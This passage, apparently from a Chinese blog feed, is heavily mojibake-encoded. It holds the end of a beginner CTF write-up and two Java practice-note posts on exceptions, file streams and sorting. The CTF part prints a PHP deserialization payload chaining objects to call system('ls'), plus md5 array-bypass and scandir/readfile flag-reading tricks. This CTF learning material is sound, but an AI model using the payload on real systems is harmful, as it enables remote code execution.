<p>é—®é¢˜åˆ°è¿™é‡Œå¾ˆæ˜ç¡®äº†â€”â€”å¦‚ä½•è®©phpè¯†åˆ«popæ—è¾¹é‚£ä¸¤ä¸ªä¸œè¥¿å‘¢?è¿™é‡Œç”¨phpä¸­çš„chr()å‡½æ•°ï¼Œå®ƒä¼šå°†asciiåè¿›åˆ¶æ•°è½¬åŒ–ä¸ºç¬¦å·,æˆ‘ä»¬è¿˜è¦æ³¨æ„å­—ç¬¦ä¸²çš„æ‹¼æ¥ç”¨.æ¥è¿æ¥</p>
<p>$b&#x3D;â€™O:6:â€hnusecâ€:2:{s:3:â€expâ€;O:3:â€airâ€:1:{s:3:â€expâ€;O:3:â€popâ€:2:{s:8:â€â€˜<strong>.chr(0).</strong>â€˜popâ€™<strong>.chr(0).</strong>â€˜expâ€;N;s:4:â€exp2â€;O:18:â€damndamndamdanmdanâ€:1:{s:3:â€expâ€;O:7:â€exploitâ€:2:{s:8:â€functionâ€;s:6:â€systemâ€;s:3:â€cmdâ€;s:2:â€lsâ€;}}}}}â€™</p>
<p>æ¥ç€å°±æ˜¯æ— é™åˆ¶çš„rceï¼Œä¸å¤šèµ˜è¿°</p>
<h1 id="ãƒ•ã‚£ãƒŠãƒ¼ãƒ¬ã€‚"><a href="#ãƒ•ã‚£ãƒŠãƒ¼ãƒ¬ã€‚" class="headerlink" title="ãƒ•ã‚£ãƒŠãƒ¼ãƒ¬ã€‚"></a>ãƒ•ã‚£ãƒŠãƒ¼ãƒ¬ã€‚</h1><p>è¿™é¢˜æ˜¯è€ƒå¯Ÿphpç‰¹æ€§å’Œæ— å‚æ•°rce</p>
<h2 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192112186.png" ></p>
<p>è¿™é‡Œæ˜¯å¼ºç­‰äº,0eç»•è¿‡ä¸èƒ½ç”¨,é‚£å°±ç”¨æ•°ç»„ç»•è¿‡,å½“md5()é‡Œé¢ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ—¶ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ä½†ä¸å½±å“å®ƒç»§ç»­æ‰§è¡Œåè¿”å›nullï¼Œç»“æœnull&#x3D;&#x3D;&#x3D;nullï¼ŒæˆåŠŸç»•è¿‡</p>
<h2 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192647039.png" ></p>
<p>è¿™é‡Œç›´æ¥ä¼ å…¥114514å°±å¥½äº†ï¼Œç›®çš„åº”è¯¥ä¸æ˜¯è€ƒå¯Ÿintvalç»•è¿‡ï¼Œè®©æˆ‘ä»¬è®¤è¯†è¿™ä¸ªå‡½æ•°è€Œå·²</p>
<h2 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222193337316.png" ></p>
<p>è¯´æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†è¿™æ ·å†™æ²¡ååº”ï¼Œåº”è¯¥æ˜¯æœ‰è¿‡æ»¤ï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222193645229.png" ></p>
<p>æœç„¶å•Šï¼Œæœç„¶ï¼Œè¿‡æ»¤äº†å¥½å¤šï¼ŒlinuxæŒ‡ä»¤åœ¨è¿™é‡Œæˆ‘æ˜¯ä¸ä¼šç”¨äº†,ç”¨phpçš„å‡½æ•°å†™çš„</p>
<p>scandir():æŸ¥çœ‹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶,ä¼ çš„å‚æ•°å°±æ˜¯è·¯å¾„</p>
<p>readfile():è¯»å–æ–‡ä»¶</p>
<p>è¿™é‡Œå…ˆprint_r(scandir(.))æŸ¥çœ‹æ ¹ç›®å½•(ä¸ºä»€ä¹ˆæ˜¯print_rä¸æ˜¯echo,å› ä¸ºè¿™é‡Œè¿”å›çš„æ˜¯æ•°ç»„ï¼Œechoå¤„ç†ä¸äº†)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194101516.png" ></p>
<p>è¿™é‡Œæˆ‘ä»¬åœ¨å‰ä¸‰å±‚æ‰¾åˆ°flagæ–‡ä»¶ï¼Œè¯»å–</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194422918.png" ></p>
<p>è¿™é‡Œçš„readfile()å¹³æ›¿å¾ˆå¤š,æ¯”å¦‚highlight_file,show_source,ç½‘ä¸Šè¿˜æœ‰å‡ ä¸ªå§</p>
<h1 id="ã‚«ã‚²ãƒ­ã‚¦ãƒ‡ã‚¤ã‚º"><a href="#ã‚«ã‚²ãƒ­ã‚¦ãƒ‡ã‚¤ã‚º" class="headerlink" title="ã‚«ã‚²ãƒ­ã‚¦ãƒ‡ã‚¤ã‚º"></a>ã‚«ã‚²ãƒ­ã‚¦ãƒ‡ã‚¤ã‚º</h1><p>è¿æ°”æœ€å¥½çš„ä¸€é›†ï¼Œè¯´æ˜¯è€ƒå¯Ÿè„šæœ¬èƒ½åŠ›ï¼Œä½†æˆ‘ä¸€ä¸ªè„šæœ¬æ²¡å†™ï¼Œå…¨é è¿æ°”</p>
<p>é¢˜ç›®è¯´äº†å¯†ç åœ¨cssæ–‡ä»¶é‡Œé¢</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194810531.png" ></p>
<p>è¿™é‡Œæˆ‘ä»¬å¤åˆ¶ä¸‹æ¥ï¼Œåœ¨è®°äº‹æœ¬å¯ä»¥æŠŠæ³¨é‡Šæ‰¹é‡å»æ‰</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194905273.png" ></p>
<p>ä¸€çœ‹å°±æ˜¯base64ï¼Œä½†æˆ‘åšåˆ°è¿™é‡Œçš„æ—¶å€™æ²¡æœ‰å»è§£ç ï¼Œè€Œæ˜¯ç›´æ¥æ‹¿å»burpsuiteçˆ†äº†ï¼Œç»“æœå•¥éƒ½æ²¡çˆ†å‡ºæ¥ï¼Œç„¶åæˆ‘å°±æ‹¿å»è§£ç äº†</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222195102450.png" ></p>
<p>ç„¶åæˆ‘æƒ³æ˜¯ä¸æ˜¯è¦å†™ä¸ªè„šæœ¬æŠŠè¿™äº›å­—ç¬¦æ‹¼æ¥èµ·æ¥ï¼Œç„¶åæˆ‘åœ¨ä¹±ç¿»çš„æ—¶å€™ï¼Œå“å“Ÿæˆ‘ï¼Œè¿™ä¸key is è°è°è°å—ï¼Œç„¶åç›´æ¥æ‹¿å»è¯•ï¼Œè¿˜çœŸå¾—äº†ï¼Œå…¨é è¿æ°”<img   src="/../img/$%7Bfiilename%7D/image-20240222195234074.png" ></p>
<p>åˆæ˜¯ç‚¹å‡»é¢˜ï¼Œåæ­£ä¸Šæ¬¡ä¹Ÿæ˜¯ç”¨è¿ç‚¹å™¨åšå‡ºæ¥çš„ï¼Œè¿™æ¬¡ä¹Ÿç”¨äº†ï¼Œæ²¡æƒ³åˆ°äº†è®¾ç½®äº†ç‚¹å‡»é—´éš”æ—¶é—´çš„é™åˆ¶ï¼Œç„¶åæˆ‘è°ƒåˆ°0.2sç‚¹ä¸€æ¬¡å®Œäº†ç»™ä»–æŒ‚ä¸ª30æ¥åˆ†é’Ÿå°±å‡ºæ¥äº†ï¼Œå°±å½“ä¼‘æ¯ä¸€ä¸‹å“ˆå“ˆå“ˆ</p>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>  è®°å½•ä¸€ä¸‹ç¬¬ä¸€æ¬¡æ‰“çš„å®Œæ•´çš„ctfï¼Œæ—©ä¸Šå‡†å¤‡å¼€æ‰“çš„æ—¶å€™ç®€ç›´å…´å¥‹çš„å‘æŠ–ï¼Œæ‰“å¼€é¢˜ç›®åƒç™«äº†ä¸€æ ·ä¹±æï¼Œç°åœ¨å›æƒ³è¿˜çœŸæ˜¯æµªè´¹ç²¾åŠ›å•Šï¼Œè¿™æ˜¯ä¸€åœºæŒä¹…æˆ˜ï¼Œè¿˜æ˜¯å¾—æ…¢æ…¢æ¥,æœ€åä¹Ÿæ˜¯å·®ä¸€é¢˜akï¼Œå·²ç»è¶…å‡ºæˆ‘çš„é¢„æœŸäº†ã€‚</p>
<p>  å¤ç›˜äº†ä¸€ä¸‹ä»Šå¤©çš„æ“ä½œï¼Œæ„Ÿè§‰æœ‰å‡ æ–¹é¢éœ€è¦è¯´å‡ºæ¥æŒ‡æ­£</p>
<p>  1.èµ„æ–™ä¹±å¼€ï¼Œåˆä¸å…³ï¼Œå¯¼è‡´å…¨é¢é¡µé¢ï¼Œä¹±ç³Ÿç³Ÿ(æœ€åburpsuiteè¿˜å·®ç‚¹å¹²çˆ†æˆ‘ç”µè„‘)</p>
<p>  2.æ²¡æœ‰å¤‡ä»½çš„ä¹ æƒ¯ï¼Œè§£é¢˜è¿‡ç¨‹ä¸­çœ‹åˆ°çš„å¾ˆå¤šä¿¡æ¯éƒ½æ˜¯è¦è®°å½•çš„ï¼Œä»Šå¤©é‡æ–°å¤åˆ¶ç²˜è´´å äº†è›®å¤šæ—¶é—´</p>
<p>  3.èµ›å‰å‡†å¤‡ä¸è¶³ï¼Œè™½ç„¶çŸ¥é“ä»Šå¤©åº”è¯¥ä¼šæœ‰httpçš„é¢˜ï¼Œä½†æ˜¯å¿˜è®°å»æ‰¾ipäº†ï¼Œä»Šå¤©å»æ‰¾åˆèŠ±äº†è›®ä¹…ï¼Œç—›å•Š</p>
<p>é“é˜»ä¸”é•¿ï¼ŒåŒå¿—ä»¬è¿˜éœ€åŠªåŠ›.</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>å…¥é—¨</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWebä¸­çº§å­¦ä¹ ç¬”è®°</title>
    <url>/2024/03/22/JavaWeb%E4%B8%AD%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹"><a href="#è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹" class="headerlink" title="è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹"></a>è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹</h2><span id="more"></span>

<h1 id="è‡ªå®šä¹‰å¼‚å¸¸"><a href="#è‡ªå®šä¹‰å¼‚å¸¸" class="headerlink" title="è‡ªå®šä¹‰å¼‚å¸¸"></a>è‡ªå®šä¹‰å¼‚å¸¸</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h)</span> <span class="keyword">throws</span> EnemyDeadException&#123;</span><br><span class="line">        <span class="keyword">if</span>(h.hp == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EnemyDeadException</span>(h.name+<span class="string">&quot;å·²ç»æ­»äº†&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡»æ€å¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnemyDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">        chaospeo.name = <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        chaospeo.hp = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ewoji.attack(chaospeo);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (EnemyDeadException e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240329103008655.png"  alt="image-20240329103008655"></p>
<h1 id="æ‰¾å‡ºCç›˜ä¸­æœ€å¤§å’Œæœ€å°çš„æ–‡ä»¶"><a href="#æ‰¾å‡ºCç›˜ä¸­æœ€å¤§å’Œæœ€å°çš„æ–‡ä»¶" class="headerlink" title="æ‰¾å‡ºCç›˜ä¸­æœ€å¤§å’Œæœ€å°çš„æ–‡ä»¶"></a>æ‰¾å‡ºCç›˜ä¸­æœ€å¤§å’Œæœ€å°çš„æ–‡ä»¶</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span><span class="number">0</span> ,n = <span class="number">0</span>;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;c://&quot;</span>);</span><br><span class="line">		File f[] = <span class="keyword">new</span> <span class="title class_">File</span>[f1.listFiles().length];</span><br><span class="line">		f = f1.listFiles();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; f.length; i++) &#123;</span><br><span class="line">		<span class="comment">//f.length()è¿”å›çš„æ˜¯ä¸€ä¸ªlongå‹çš„æ•°å­—</span></span><br><span class="line">			<span class="type">long</span> max,min;</span><br><span class="line">			max = f[<span class="number">0</span>].length();</span><br><span class="line">			min = f[<span class="number">0</span>].length();</span><br><span class="line">			<span class="keyword">if</span>(max&lt;f[i].length())&#123;</span><br><span class="line">				max = f[i].length();</span><br><span class="line">				m = i;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(min&gt;f[i].length())&#123;</span><br><span class="line">				min = f[i].length();</span><br><span class="line">				n=i;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">&quot;æœ€å¤§çš„æ–‡ä»¶æ˜¯&quot;</span>+f[m].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;å¤§å°æ˜¯&quot;</span>+f[m].length());</span><br><span class="line">		System.out.println(<span class="string">&quot;æœ€å°çš„æ–‡ä»¶æ˜¯&quot;</span>+f[n].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;å¤§å°æ˜¯&quot;</span>+f[n].length());</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯æƒé™é—®é¢˜ï¼Œæ‰«å‡ºæ¥å¥½å‡ ä¸ªæ–‡ä»¶æ˜¯0kb</p>
<h1 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/åŒé‡urlç¼–ç .py&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span>(<span class="type">FileInputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f))&#123;</span><br><span class="line">       <span class="type">byte</span> text[] = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>)f.length()];</span><br><span class="line">       <span class="type">char</span> tex[] = <span class="keyword">new</span> <span class="title class_">char</span>[text.length];</span><br><span class="line">       <span class="comment">//å¡«å……çš„æ˜¯æ•°å­—å­—èŠ‚</span></span><br><span class="line">       fio.read(text);</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; text.length; i++) &#123;</span><br><span class="line">          tex[i] = (<span class="type">char</span>)text[i];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">String</span> <span class="variable">my</span> <span class="operator">=</span> String.valueOf(tex);</span><br><span class="line">       System.out.println(my);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="åˆ›å»ºæ–‡ä»¶å¹¶ä¸”å†™å…¥æ–‡ä»¶"><a href="#åˆ›å»ºæ–‡ä»¶å¹¶ä¸”å†™å…¥æ–‡ä»¶" class="headerlink" title="åˆ›å»ºæ–‡ä»¶å¹¶ä¸”å†™å…¥æ–‡ä»¶"></a>åˆ›å»ºæ–‡ä»¶å¹¶ä¸”å†™å…¥æ–‡ä»¶</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test.txt&quot;</span>);</span><br><span class="line">		<span class="comment">//åˆ›å»º</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			f.createNewFile();</span><br><span class="line">		&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//å†™å…¥</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="type">FileOutputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f);</span><br><span class="line">			<span class="type">byte</span> ji[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>&#125;;</span><br><span class="line">			fio.write(ji);</span><br><span class="line">			fio.close();</span><br><span class="line">		&#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240329115117304.png"  alt="image-20240329115117304"></p>
<h1 id="æ‹†åˆ†æ–‡ä»¶"><a href="#æ‹†åˆ†æ–‡ä»¶" class="headerlink" title="æ‹†åˆ†æ–‡ä»¶"></a>æ‹†åˆ†æ–‡ä»¶</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹†åˆ†</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test1.txt&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test2.txt&quot;</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    f1.createNewFile();</span><br><span class="line">    f2.createNewFile();</span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f1);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f2);</span><br><span class="line">    <span class="type">byte</span> kb1[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb2[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb3[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fio3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">    fio3.read(kb3);</span><br><span class="line">    fio3.close();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; kb1.length; i++) &#123;</span><br><span class="line">       kb1[i] = kb3[i];</span><br><span class="line">       kb2[i] = kb3[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fio1.write(kb1);</span><br><span class="line">    fio2.write(kb2);</span><br><span class="line">    fio1.close();</span><br><span class="line">    fio2.close();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç”¨æµå¤åˆ¶å›¾ç‰‡"><a href="#ç”¨æµå¤åˆ¶å›¾ç‰‡" class="headerlink" title="ç”¨æµå¤åˆ¶å›¾ç‰‡"></a>ç”¨æµå¤åˆ¶å›¾ç‰‡</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">		<span class="type">FileInputStream</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;e://ctf/ljava/go.png&quot;</span>);</span><br><span class="line">		<span class="type">byte</span> kb[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">		fr.read(kb);</span><br><span class="line">		<span class="type">FileOutputStream</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;e://ctf/ljava/go1.png&quot;</span>);</span><br><span class="line">		fw.write(kb);</span><br><span class="line">		fr.close();</span><br><span class="line">		fw.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//main</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWebåŸºç¡€å­¦ä¹ ç¬”è®°</title>
    <url>/2024/03/19/JavaWeb%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹"><a href="#è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹" class="headerlink" title="è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹"></a>è®°å½•ä¸€äº›å­¦ä¹ ä¸­è‡ªå·±å†™çš„ä¸€äº›å®ä¾‹</h2><span id="more"></span>

<h1 id="æŸ¥çœ‹å˜é‡çš„ç±»å‹"><a href="#æŸ¥çœ‹å˜é‡çš„ç±»å‹" class="headerlink" title="æŸ¥çœ‹å˜é‡çš„ç±»å‹"></a>æŸ¥çœ‹å˜é‡çš„ç±»å‹</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æŸ¥çœ‹å˜é‡ç±»å‹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">typeof</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o.getClass().toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="å†’æ³¡æ’åºå’Œé€‰æ‹©æ’åºå’Œå¿«é€Ÿæ’åºçš„å®ç°"><a href="#å†’æ³¡æ’åºå’Œé€‰æ‹©æ’åºå’Œå¿«é€Ÿæ’åºçš„å®ç°" class="headerlink" title="å†’æ³¡æ’åºå’Œé€‰æ‹©æ’åºå’Œå¿«é€Ÿæ’åºçš„å®ç°"></a>å†’æ³¡æ’åºå’Œé€‰æ‹©æ’åºå’Œå¿«é€Ÿæ’åºçš„å®ç°</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å†’æ³¡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Bubble</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,temp;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(a[i]&gt;a[j])&#123;</span><br><span class="line">    				temp = a[i];</span><br><span class="line">    				a[i] = a[j];</span><br><span class="line">    				a[j] = temp;</span><br><span class="line">    			&#125;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//é€‰æ‹©</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Select</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,max,temp,x=<span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">       		max = a[i];</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(max&lt;a[j])&#123;</span><br><span class="line">    				max = a[j];</span><br><span class="line">    				x=j;</span><br><span class="line">    			&#125;</span><br><span class="line">    			temp = a[i];</span><br><span class="line">    			a[i] = a[x];</span><br><span class="line">    			a[x] = temp;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å¿«æ’</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">qsort</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> s,<span class="type">int</span> f)</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> f;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (s+f)/<span class="number">2</span>;</span><br><span class="line">    	<span class="type">int</span> temp;</span><br><span class="line">    	<span class="keyword">do</span>&#123;</span><br><span class="line">    		<span class="keyword">while</span>(a[j]&gt;a[mid]) j--;</span><br><span class="line">    		<span class="keyword">while</span>(a[i]&lt;a[mid]) i++;</span><br><span class="line">    		</span><br><span class="line">    		<span class="keyword">if</span>(i&lt;=j)&#123;</span><br><span class="line">    			temp = a[j];</span><br><span class="line">    			a[j] = a[i];</span><br><span class="line">    			a[i] = temp;</span><br><span class="line">    			i++;</span><br><span class="line">    			j--;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;<span class="keyword">while</span>(i&lt;=j);</span><br><span class="line">    	<span class="keyword">if</span>(i&lt;f) qsort(a,i,f);</span><br><span class="line">    	<span class="keyword">if</span>(s&lt;j) qsort(a,s,j);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



